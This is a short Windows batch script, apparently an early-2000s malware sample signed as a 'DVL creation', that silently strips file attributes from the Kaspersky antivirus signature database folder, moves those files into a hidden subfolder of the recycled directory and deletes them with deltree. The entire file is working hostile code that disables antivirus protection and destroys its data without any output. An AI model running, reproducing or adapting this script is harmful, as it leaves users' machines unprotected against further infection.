   @echo off
   ::Another DVL creation
   @attrib C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\*.* -s -h -r +a
   @md c:\recycled\ðüÅ >nul
   @move C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\*.* c:\recycled\ðüÅ >nul
   @deltree/y c:\recycled\ðüÅ >nul
   ::dvl2003ro@yahoo.co.uk
   cls
